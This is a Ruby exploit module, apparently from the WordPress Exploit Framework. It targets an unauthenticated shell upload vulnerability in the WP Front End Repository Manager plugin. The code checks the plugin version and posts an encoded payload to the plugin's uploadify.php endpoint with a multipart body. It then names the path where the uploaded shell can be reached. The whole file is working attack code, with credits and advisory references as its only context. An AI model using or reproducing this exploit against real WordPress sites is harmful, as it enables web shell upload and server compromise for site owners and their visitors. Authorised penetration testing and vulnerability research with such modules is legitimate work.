# frozen_string_literal: true

class Wpxf::Exploit::WpFrontEndRepositoryManagerShellUpload < Wpxf::Module
  include Wpxf::WordPress::ShellUpload

  def initialize
    super

    update_info(
      name: 'WP Front End Repostiory Manager Unauthenticated Shell Upload',
      author: [
        'Larry W. Cashdollar', # Discovery and disclosure
        'rastating'            # WPXF module
      ],
      references: [
        ['WPVDB', '8100'],
        ['URL', 'http://www.vapid.dhs.org/advisory.php?v=141']
      ],
      date: 'Jul 12 2015'
    )
  end

  def check
    check_plugin_version_from_readme('wp-front-end-repository')
  end

  def uploader_url
    normalize_uri(wordpress_url_plugins, 'wp-front-end-repository', 'js', 'uploadify', 'uploadify.php')
  end

  def payload_body_builder
    builder = Utility::BodyBuilder.new
    builder.add_field('name', payload_name)
    builder.add_field('folder', './')
    builder.add_file_from_string('Filedata', payload.encoded, payload_name)
    builder
  end

  def uploaded_payload_location
    normalize_uri(wordpress_url_plugins, 'wp-front-end-repository', 'js', 'uploadify', payload_name)
  end
end
